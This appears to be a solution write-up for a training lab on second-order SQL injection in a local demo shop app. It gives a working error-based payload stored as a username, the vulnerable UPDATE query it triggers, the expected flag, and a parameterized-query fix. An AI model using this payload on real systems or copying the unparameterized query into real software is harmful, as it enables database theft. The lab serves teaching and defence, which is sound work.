# Lab 06 Solution: CyberShop Fulfillment Portal

## Goal

Recover the `FULFILLMENT_FLAG` value from `shop_admin_notes`.

Expected final value:

```text
FLAG{stored_payloads_wake_up_later}
```

## Step 1: Register With A Stored Payload

Open:

```text
http://localhost:3000/lab/06-second-order/cart
```

Register a new account.

Username:

```sql
' OR 1=CAST((SELECT note_data FROM shop_admin_notes WHERE note_type='FULFILLMENT_FLAG') AS integer) --
```

Use any email and password you can remember.

Registration should succeed. The payload is only stored at this stage.

## Step 2: Log In

Switch to login and use the same payload as the username with the password you
created.

You should reach the profile page.

## Step 3: Trigger The Stored Payload

On the profile page, change the email value and click save.

The stored username is loaded from the database and inserted into this vulnerable
query:

```sql
UPDATE shop_users
SET email='<new_email>'
WHERE username='<stored_username>';
```

Because the stored username contains a payload, PostgreSQL attempts to cast the
flag text to an integer.

## Step 4: Read The Flag From The Error

The profile update fails with an invalid integer error containing:

```text
FLAG{stored_payloads_wake_up_later}
```

## Why It Works

This is second-order SQL injection:

- First step: the payload is stored as account data.
- Second step: a later feature reuses that stored data inside SQL.
- The vulnerable behavior happens during profile update, not registration.

## Secure Fix

Parameterize the profile update query:

```ts
await pool.query(
  "UPDATE shop_users SET email = $1 WHERE username = $2",
  [newEmail, username]
);
```

Every SQL execution point must be parameterized, even when the value originally
came from the application database.
